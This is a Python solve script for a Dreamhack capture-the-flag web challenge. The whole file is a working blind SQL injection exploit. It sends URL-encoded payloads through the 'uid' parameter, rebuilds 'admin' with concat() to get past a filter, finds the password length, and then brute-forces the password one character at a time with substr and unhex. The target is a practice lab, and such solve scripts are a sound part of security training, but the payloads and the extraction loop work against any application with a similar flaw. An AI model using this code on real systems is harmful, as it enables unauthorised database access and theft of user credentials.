import requests
import string

import asyncio, aiohttp

TEST_LOC = ""

if TEST_LOC == "local":
    HOST = "http://127.0.0.1"
    PORT = ""
else:
    HOST = "http://host3.dreamhack.games"
    PORT = "11966"

ATTACK_URI = "/?uid="
CHECK_LENGTH_CODE_START = """%27%7C%7C%28uid%3Dconcat%28%27adm%27%2C%27in%27%29%26%26length%28upw%29%3D"""
CHECK_LENGTH_CODE_END =  """%29%23"""
CORRECT_SIGN = "<pre>admin</pre>"

FLAG = ""
FLAG_LENGTH = 0


print('[+] STEP1. CHECK FLAG LENGTH')

for LEN in range(100, 1, -1):
    PAYLOAD = ATTACK_URI + CHECK_LENGTH_CODE_START + str(LEN) + CHECK_LENGTH_CODE_END
    resp = requests.get(HOST + ":" + PORT + PAYLOAD)
    if resp.text.find(CORRECT_SIGN) > 0:
        FLAG_LENGTH = LEN
        break

print('[+] FLAG LENGTH : ' + str(FLAG_LENGTH))
print('[+] STEP2. Do Blind SQLi and Find the FLAG')

BLIND_SQLI_CODE_START = """%27%7C%7C%28uid%3Dconcat%28%27adm%27%2C%27in%27%29%26%26substr%28upw%2C"""
BLIND_SQLI_CODE_MID = """%2C1%29%3Dunhex%28%27"""
BLIND_SQLI_CODE_END = """%27%29%29%23"""

for idx in range(FLAG_LENGTH):
    for flag_elem in string.printable:
        PAYLOAD = ATTACK_URI + BLIND_SQLI_CODE_START + str(idx + 1) + BLIND_SQLI_CODE_MID + f'{ord(flag_elem):X}' + BLIND_SQLI_CODE_END
        resp = requests.get(HOST + ":" + PORT + PAYLOAD)
        if resp.text.find(CORRECT_SIGN) > 0:
            FLAG += flag_elem
            print('[+] No.' + str(idx + 1) + '=' + flag_elem)
            break

print('[+] FLAG : ' + FLAG[:2].upper() + FLAG[2:].lower())